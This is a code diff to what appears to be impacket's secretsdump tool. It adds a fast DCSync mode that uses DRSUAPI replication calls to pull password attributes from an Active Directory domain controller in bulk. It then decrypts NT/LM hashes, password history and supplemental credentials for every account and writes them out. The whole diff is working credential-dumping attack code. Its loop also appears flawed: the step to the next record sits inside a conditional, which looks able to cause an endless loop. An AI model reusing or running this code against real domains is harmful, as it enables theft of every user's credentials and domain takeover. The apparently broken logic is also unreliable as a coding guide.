@@ -322,8 +322,10 @@ class RemoteOperations:
         self.__samr = None
         self.__domainHandle = None
         self.__domainName = None
+        self.__domainDN = None
 
         self.__drsr = None
+        self.__fastDRSRequest = None
         self.__hDrs = None
         self.__NtdsDsaObjectGuid = None
         self.__ppartialAttrSet = None
@@ -455,9 +457,13 @@ class RemoteOperations:
 
         if resp['pmsgOut']['V2']['cItems'] > 0:
             self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
+            self.__domainDN =resp['pmsgOut']['V2']['rItems'][0]['ComputerObjectName'][resp['pmsgOut']['V2']['rItems'][0]['ComputerObjectName'].index('DC='):]
         else:
             LOG.error("Couldn't get DC info for domain %s" % self.__domainName)
             raise Exception('Fatal, aborting')
+
+    def getDomainDN(self):
+        return self.__domainDN
 
     def getDrsr(self):
         return self.__drsr
@@ -469,6 +475,66 @@ class RemoteOperations:
 
         LOG.debug('Calling DRSCrackNames for %s ' % name)
         resp = drsuapi.hDRSCrackNames(self.__drsr, self.__hDrs, 0, formatOffered, formatDesired, (name,))
+        return resp
+
+    def DRSGetNCChangesFast(self):
+        if self.__drsr is None:
+            self.__connectDrds()
+
+        LOG.debug('Calling DRSGetNCChangesFast for domain %s' % self.__domainDN)
+
+        if self.__fastDRSRequest is not None:
+            request = self.__fastDRSRequest
+            request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__uuidInvocIdSrc
+            request['pmsgIn']['V8']['usnvecFrom'] = self.__usnvecFrom
+        else:
+            request = drsuapi.DRSGetNCChanges()
+            request['hDrs'] = self.__hDrs
+            request['dwInVersion'] = 8
+
+            request['pmsgIn']['tag'] = 8
+            request['pmsgIn']['V8']['uuidDsaObjDest'] = self.__NtdsDsaObjectGuid
+            request['pmsgIn']['V8']['uuidInvocIdSrc'] = self.__NtdsDsaObjectGuid
+
+            dsName = drsuapi.DSNAME()
+            dsName['SidLen'] = 0
+            dsName['Guid'] = drsuapi.NULLGUID
+            dsName['Sid'] = ''
+            dsName['NameLen'] = len(self.__domainDN)-1
+            dsName['StringName'] = self.__domainDN
+
+            dsName['structLen'] = len(dsName.getData())
+
+            request['pmsgIn']['V8']['pNC'] = dsName
+
+            request['pmsgIn']['V8']['usnvecFrom']['usnHighObjUpdate'] = 0
+            request['pmsgIn']['V8']['usnvecFrom']['usnHighPropUpdate'] = 0
+
+            request['pmsgIn']['V8']['pUpToDateVecDest'] = NULL
+
+            request['pmsgIn']['V8']['ulFlags'] = drsuapi.DRS_INIT_SYNC | drsuapi.DRS_NEVER_SYNCED | drsuapi.DRS_WRIT_REP | \
+                                                 drsuapi.DRS_FULL_SYNC_NOW | drsuapi.DRS_SYNC_URGENT
+            request['pmsgIn']['V8']['cMaxObjects'] = 300
+            request['pmsgIn']['V8']['cMaxBytes'] = 0
+            request['pmsgIn']['V8']['ulExtendedOp'] = 0
+            if self.__ppartialAttrSet is None:
+                self.__prefixTable = []
+                self.__ppartialAttrSet = drsuapi.PARTIAL_ATTR_VECTOR_V1_EXT()
+                self.__ppartialAttrSet['dwVersion'] = 1
+                self.__ppartialAttrSet['cAttrs'] = len(NTDSHashes.ATTRTYP_TO_ATTID)
+                for attId in NTDSHashes.ATTRTYP_TO_ATTID.values():
+                    self.__ppartialAttrSet['rgPartialAttr'].append(drsuapi.MakeAttid(self.__prefixTable , attId))
+            request['pmsgIn']['V8']['pPartialAttrSet'] = self.__ppartialAttrSet
+            request['pmsgIn']['V8']['PrefixTableDest']['PrefixCount'] = len(self.__prefixTable)
+            request['pmsgIn']['V8']['PrefixTableDest']['pPrefixEntry'] = self.__prefixTable
+            request['pmsgIn']['V8']['pPartialAttrSetEx1'] = NULL
+
+        resp  = self.__drsr.request(request)
+
+        self.__fastDRSRequest = request
+        self.__uuidInvocIdSrc = resp['pmsgOut']['V6']['uuidInvocIdSrc']
+        self.__usnvecFrom = resp['pmsgOut']['V6']['usnvecTo']
+
         return resp
 
     def DRSGetNCChanges(self, userEntry):
@@ -1688,7 +1754,7 @@ class NTDSHashes:
                  useVSSMethod=False, justNTLM=False, pwdLastSet=False, resumeSession=None, outputFileName=None,
                  justUser=None, printUserStatus=False,
                  perSecretCallback = lambda secretType, secret : _print_helper(secret),
-                 resumeSessionMgr=ResumeSessionMgrInFile):
+                 resumeSessionMgr=ResumeSessionMgrInFile, fastDRS=True):
         self.__bootKey = bootKey
         self.__NTDS = ntdsFile
         self.__history = history
@@ -1710,6 +1776,7 @@ class NTDSHashes:
         self.__outputFileName = outputFileName
         self.__justUser = justUser
         self.__perSecretCallback = perSecretCallback
+        self.__fastDRS = fastDRS
 
     def getResumeSessionFile(self):
         return self.__resumeSession.getFileName()
@@ -1824,8 +1891,7 @@ class NTDSHashes:
         else:
             domain = None
             userName = None
-            replyVersion = 'V%d' % record['pdwOutVersion']
-            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
+            for attr in record['Entinf']['AttrBlock']['pAttr']:
                 try:
                     attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                     LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
@@ -1849,10 +1915,10 @@ class NTDSHashes:
                             userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                         except:
                             LOG.error(
-                                'Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                                'Cannot get sAMAccountName for %s' % record['Entinf']['pName']['StringName'][:-1])
                             userName = 'unknown'
                     else:
-                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                        LOG.error('Cannot get sAMAccountName for %s' % record['Entinf']['pName']['StringName'][:-1])
                         userName = 'unknown'
                 if attId == LOOKUP_TABLE['supplementalCredentials']:
                     if attr['AttrVal']['valCount'] > 0:
@@ -2014,16 +2080,17 @@ class NTDSHashes:
                         self.__writeOutput(outputFile, answer + '\n')
                     self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
         else:
-            replyVersion = 'V%d' %record['pdwOutVersion']
-            LOG.debug('Decrypting hash for user: %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+            LOG.debug('Decrypting hash for user: %s' % record['Entinf']['pName']['StringName'][:-1])
             domain = None
+            userName = None
+            NTHash = None
             if self.__history:
                 LMHistory = []
                 NTHistory = []
 
-            rid = unpack('<L', record['pmsgOut'][replyVersion]['pObjects']['Entinf']['pName']['Sid'][-4:])[0]
+            rid = unpack('<L', record['Entinf']['pName']['Sid'][-4:])[0]
 
-            for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
+            for attr in record['Entinf']['AttrBlock']['pAttr']:
                 try:
                     attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
                     LOOKUP_TABLE = self.ATTRTYP_TO_ATTID
@@ -2060,23 +2127,23 @@ class NTDSHashes:
                         try:
                             userName = ''.join(attr['AttrVal']['pAVal'][0]['pVal']).decode('utf-16le')
                         except:
-                            LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                            LOG.error('Cannot get sAMAccountName for %s' % record['Entinf']['pName']['StringName'][:-1])
                             userName = 'unknown'
                     else:
-                        LOG.error('Cannot get sAMAccountName for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                        LOG.error('Cannot get sAMAccountName for %s' % record['Entinf']['pName']['StringName'][:-1])
                         userName = 'unknown'
                 elif attId == LOOKUP_TABLE['objectSid']:
                     if attr['AttrVal']['valCount'] > 0:
                         objectSid = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
                     else:
-                        LOG.error('Cannot get objectSid for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                        LOG.error('Cannot get objectSid for %s' % record['Entinf']['pName']['StringName'][:-1])
                         objectSid = rid
                 elif attId == LOOKUP_TABLE['pwdLastSet']:
                     if attr['AttrVal']['valCount'] > 0:
                         try:
                             pwdLastSet = self.__fileTimeToDateTime(unpack('<Q', ''.join(attr['AttrVal']['pAVal'][0]['pVal']))[0])
                         except:
-                            LOG.error('Cannot get pwdLastSet for %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                            LOG.error('Cannot get pwdLastSet for %s' % record['Entinf']['pName']['StringName'][:-1])
                             pwdLastSet = 'N/A'
                 elif self.__printUserStatus and attId == LOOKUP_TABLE['userAccountControl']:
                     if attr['AttrVal']['valCount'] > 0:
@@ -2096,7 +2163,8 @@ class NTDSHashes:
                                 LMHashHistory = drsuapi.removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                                 LMHistory.append(LMHashHistory)
                         else:
-                            LOG.debug('No lmPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                            LOG.debug('No lmPwdHistory for user %s' % record['Entinf']['pName']['StringName'][:-1])
+                            pass
                     elif attId == LOOKUP_TABLE['ntPwdHistory']:
                         if attr['AttrVal']['valCount'] > 0:
                             encryptedNTHistory = ''.join(attr['AttrVal']['pAVal'][0]['pVal'])
@@ -2105,33 +2173,35 @@ class NTDSHashes:
                                 NTHashHistory = drsuapi.removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                                 NTHistory.append(NTHashHistory)
                         else:
-                            LOG.debug('No ntPwdHistory for user %s' % record['pmsgOut'][replyVersion]['pNC']['StringName'][:-1])
+                            LOG.debug('No ntPwdHistory for user %s' % record['Entinf']['pName']['StringName'][:-1])
+                            pass
 
-            if domain is not None:
-                userName = '%s\\%s' % (domain, userName)
+            if NTHash is not None:
+                if domain is not None:
+                    userName = '%s\\%s' % (domain, userName)
 
-            answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
-            if self.__pwdLastSet is True:
-                answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            if self.__printUserStatus is True:
-                answer = "%s (status=%s)" % (answer, userAccountStatus)
-            self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
+                answer = "%s:%s:%s:%s:::" % (userName, rid, hexlify(LMHash), hexlify(NTHash))
+                if self.__pwdLastSet is True:
+                    answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
+                if self.__printUserStatus is True:
+                    answer = "%s (status=%s)" % (answer, userAccountStatus)
+                self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
 
-            if outputFile is not None:
-                self.__writeOutput(outputFile, answer + '\n')
+                if outputFile is not None:
+                    self.__writeOutput(outputFile, answer + '\n')
 
-            if self.__history:
-                for i, (LMHashHistory, NTHashHistory) in enumerate(
-                        map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
-                    if self.__noLMHash:
-                        lmhash = hexlify(ntlm.LMOWFv1('', ''))
-                    else:
-                        lmhash = hexlify(LMHashHistory)
+                if self.__history:
+                    for i, (LMHashHistory, NTHashHistory) in enumerate(
+                            map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
+                        if self.__noLMHash:
+                            lmhash = hexlify(ntlm.LMOWFv1('', ''))
+                        else:
+                            lmhash = hexlify(LMHashHistory)
 
-                    answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
-                    self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
-                    if outputFile is not None:
-                        self.__writeOutput(outputFile, answer + '\n')
+                        answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
+                        self.__perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer)
+                        if outputFile is not None:
+                            self.__writeOutput(outputFile, answer + '\n')
 
         if outputFile is not None:
             outputFile.flush()
@@ -2285,11 +2355,11 @@ class NTDSHashes:
                         LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                         crackedName['pmsgOut']['V1']['pResult']['cItems'], self.__justUser))
                     try:
-                        self.__decryptHash(userRecord,
+                        self.__decryptHash(userRecord['pmsgOut'][replyVersion]['pObjects'],
                                            userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                            hashesOutputFile)
                         if self.__justNTLM is False:
-                            self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
+                            self.__decryptSupplementalInfo(userRecord['pmsgOut'][replyVersion]['pObjects'], userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                                 'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
 
                     except Exception, e:
@@ -2297,6 +2367,25 @@ class NTDSHashes:
                         #traceback.print_exc()
                         LOG.error("Error while processing user!")
                         LOG.error(str(e))
+                elif self.__fastDRS is True:
+                    LOG.info('Trying DRSUAPI in fast mode. No resume available, good luck!')
+                    remainingData = True
+                    while remainingData:
+                        objects = self.__remoteOps.DRSGetNCChangesFast()
+                        replyVersion = 'V%d' % objects['pdwOutVersion']
+                        LOG.debug("Num Objects received: %d" % objects['pmsgOut'][replyVersion]['cNumObjects'])
+                        userRecord = objects['pmsgOut'][replyVersion]['pObjects']
+                        while userRecord != '':
+                            if userRecord['Entinf']['pName']['StringName'].find('Deleted') <= 0:
+                                self.__decryptHash(userRecord, objects['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'], hashesOutputFile)
+                            else:
+                                LOG.debug('Skipping %s' % userRecord['Entinf']['pName']['StringName'])
+                            if self.__justNTLM is False:
+                                self.__decryptSupplementalInfo(userRecord,
+                                                               objects['pmsgOut'][replyVersion]['PrefixTableSrc'][
+                                                                   'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
+                                userRecord = userRecord['pNextEntInf']
+                        remainingData = objects['pmsgOut']['V6']['fMoreData'] > 0
                 else:
                     while status == STATUS_MORE_ENTRIES:
                         resp = self.__remoteOps.getDomainUsers(enumerationContext)
@@ -2338,11 +2427,11 @@ class NTDSHashes:
                                 LOG.warning('DRSCrackNames returned %d items for user %s, skipping' % (
                                 crackedName['pmsgOut']['V1']['pResult']['cItems'], userName))
                             try:
-                                self.__decryptHash(userRecord,
+                                self.__decryptHash(userRecord['pmsgOut'][replyVersion]['pObjects'],
                                                    userRecord['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry'],
                                                    hashesOutputFile)
                                 if self.__justNTLM is False:
-                                    self.__decryptSupplementalInfo(userRecord, userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
+                                    self.__decryptSupplementalInfo(userRecord['pmsgOut'][replyVersion]['pObjects'], userRecord['pmsgOut'][replyVersion]['PrefixTableSrc'][
                                         'pPrefixEntry'], keysOutputFile, clearTextOutputFile)
 
                             except Exception, e:
